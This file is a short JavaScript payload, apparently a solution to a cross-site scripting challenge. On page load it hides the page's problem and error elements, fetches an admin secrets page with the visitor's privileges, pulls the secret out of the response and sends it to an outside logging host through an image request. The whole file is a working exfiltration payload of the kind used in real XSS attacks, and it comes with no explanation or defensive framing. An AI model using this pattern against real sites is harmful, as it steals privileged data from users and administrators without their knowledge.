document.addEventListener("DOMContentLoaded", function() {
	
	var prob = document.getElementsByClassName("problem")[0];
	var err = document.getElementsByClassName("error-message")[0];
	prob.parentNode.removeChild(prob);
	err.parentNode.removeChild(err);
	$.ajax({url:"http://xss-challenges.r7.io/admin/secrets", success: function(hello){
		var secret = $.parseHTML(hello)[1].innerHTML;
		var img = new Image();
		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(secret);
		console.log(img);
		alert(secret);
	}});
});

